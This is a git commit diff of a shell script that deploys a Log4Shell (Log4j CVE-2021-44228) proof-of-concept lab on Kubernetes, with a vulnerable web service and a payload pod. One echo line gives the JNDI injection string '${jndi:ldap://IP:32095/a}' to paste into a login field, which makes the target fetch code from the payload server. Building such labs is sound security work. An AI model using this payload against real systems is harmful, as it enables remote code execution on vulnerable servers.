8d3914daa32b39412bfe9e439ea5a36c1f1f7e61
buchmann <buchmann.manfred@yahoo.com>
2022-02-09 19:08:11 +0000

    second commit

--- build-log4j.sh
+++ build-log4j.sh
@@ -4,6 +4,11 @@ echo " Maseternode IP : " $masternode
 echo " add master node ip to "
 sed  "s/masternodeip/${masternode}/g" ./cve-poc-deployment.yaml.template > ./cve-poc-deployment.yaml 
 echo "sed done"
+echo "Start creating the services for web and payload pod "
+kubectl -n log4j apply -f cve-web-deployment.yaml
+kubectl -n log4j apply -f cve-web-service.yaml
+kubectl -n log4j apply -f cve-poc-service.yaml
+kubectl -n log4j apply -f cve-poc-deployment.yaml
 echo " paste ${jndi:ldap://IP:32095/a} replace IP with : "$masternode" in Userfield at login Browser in order start connection "
 
 
